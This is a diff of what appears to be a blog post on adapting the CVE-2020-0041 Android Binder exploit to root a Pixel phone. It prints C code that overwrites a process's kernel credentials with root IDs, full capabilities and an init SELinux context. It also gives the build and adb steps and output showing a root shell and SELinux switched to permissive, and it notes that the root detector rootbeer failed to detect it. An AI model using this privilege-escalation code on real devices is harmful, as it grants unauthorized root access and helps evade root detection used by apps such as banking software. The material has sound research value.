@@ -93,11 +93,53 @@ OFFSET_PIPE_FOP
 #define OFFSET_PIPE_FOP 0x2173650
 ```
 
+## Issues & improvements
+
+After the adaptation of the exploit and its execution, you will obtain a root shell; however, this root shell is very limited and you will have some problems executing binaries and creating files. Finding on the Internet I found the issue: *you need to patch the security context of the root user.*
+
+During the exploit execution the process executed need to be patched with the correct security context for the root user. The next function is used to patch the credentials of a specific address:
+
+```c
+void patch_task_cred(uint64_t cred_addr, uint32_t init_sid)
+{
+    uint64_t val;
+    struct cred *cred = (void *)cred_addr;
+    struct task_security_struct *sec;
+
+    if (cred == NULL)
+        return;
+
+    val = 0;
+    write32((uint64_t)&cred->uid, val);
+    write32((uint64_t)&cred->gid, val);
+    write32((uint64_t)&cred->suid, val);
+    write32((uint64_t)&cred->sgid, val);
+    write32((uint64_t)&cred->euid, val);
+    write32((uint64_t)&cred->egid, val);
+    write32((uint64_t)&cred->fsuid, val);
+    write32((uint64_t)&cred->fsgid, val);
+    write32((uint64_t)&cred->securebits, val);
+
+    val = ~(0UL);
+    write64((uint64_t)&cred->cap_inheritable, val);
+    write64((uint64_t)&cred->cap_permitted, val);
+    write64((uint64_t)&cred->cap_effective, val);
+    write64((uint64_t)&cred->cap_bset, val);
+
+    sec = (void *)read64((uint64_t)&cred->security);
+
+    if (sec != NULL) {
+        write32((uint64_t)&sec->osid, init_sid);
+        write32((uint64_t)&sec->sid, init_sid);
+    }
+}
+```
+
 ## Testing the exploit 
 
->The exploit can be built by simply running "make" with the Android NDK in the path. It can also be pushed to a phone attached with adb by doing "make all push". Now just run /data/local/tmp/poc from an adb shell to see the exploit running:
+*The exploit can be built by simply running "make" with the Android NDK in the path. It can also be pushed to a phone attached with adb by doing "make all push". Now just run /data/local/tmp/poc from an adb shell to see the exploit running:*
 
-{{< code language="bash" title="Exploit execution output" id="1" expand="Show" collapse="Hide" isCollapsed="true" >}}
+{{< code language="bash" title="Executing the root exploit" id="1" expand="Show" collapse="Hide" isCollapsed="true" >}}
 [+] Mapped 200000
 [+] selinux_enforcing before exploit: 1
 [+] pipe file: 0xffffffd9c67c7700
@@ -140,52 +182,6 @@ Permissive
 root_by_cve-2020-0041:/ # 
 {{< /code >}}
 
-I use to run [rootbeer](https://play.google.com/store/apps/details?id=com.scottyab.rootbeer.sample&hl=es_419&gl=US) sample app for a fast root detection test. Despite this third party library is not using the same detection methods as banking applications is a good way to get an idea of how much is hidden your rooted device. 
+I usually run run [rootbeer](https://play.google.com/store/apps/details?id=com.scottyab.rootbeer.sample&hl=es_419&gl=US) sample app for a fast root detection test. Despite this third party library is not using the same detection methods as banking applications is a good way to get an idea of how much your rooted device is hidden. Rootbeer was not able to detect root while using this privilege escalation exploit.
 
-<img src="/posts/pixelroot/rootbeer.png" alt="rootbeer root detection" style="height:200px;margin:0 20px 10px 0">
-
-## Issues & improvements
-
-After the adaptation of the exploit and its execution, you will obtain a root shell; however, this root shell is very limited and you will have some problems executing binaries and creating files. 
-
-Finding on the Internet I found the issue: *you need to patch the security context of the root user.*
-
-During the exploit execution the process executed need to be patched with the correct security context for the root user. The next function is used to patch the credentials of a specific address:
-
-
-{{< code language="c" title="Patching task credentials" id="2" expand="Show" collapse="Hide" isCollapsed="true" >}}
-void patch_task_cred(uint64_t cred_addr, uint32_t init_sid)
-{
-    uint64_t val;
-    struct cred *cred = (void *)cred_addr;
-    struct task_security_struct *sec;
-
-    if (cred == NULL)
-        return;
-
-    val = 0;
-    write32((uint64_t)&cred->uid, val);
-    write32((uint64_t)&cred->gid, val);
-    write32((uint64_t)&cred->suid, val);
-    write32((uint64_t)&cred->sgid, val);
-    write32((uint64_t)&cred->euid, val);
-    write32((uint64_t)&cred->egid, val);
-    write32((uint64_t)&cred->fsuid, val);
-    write32((uint64_t)&cred->fsgid, val);
-    write32((uint64_t)&cred->securebits, val);
-
-    val = ~(0UL);
-    write64((uint64_t)&cred->cap_inheritable, val);
-    write64((uint64_t)&cred->cap_permitted, val);
-    write64((uint64_t)&cred->cap_effective, val);
-    write64((uint64_t)&cred->cap_bset, val);
-    //write64((uint64_t)&cred->cap_ambient, val);
-
-    sec = (void *)read64((uint64_t)&cred->security);
-
-    if (sec != NULL) {
-        write32((uint64_t)&sec->osid, init_sid);
-        write32((uint64_t)&sec->sid, init_sid);
-    }
-}
-{{< /code >}}
+{{< image src="/posts/img/pixelroot/rootbeer.png" alt="Using rootbeer" style="align: center;border-radius: 8px;height: 600px;">}}
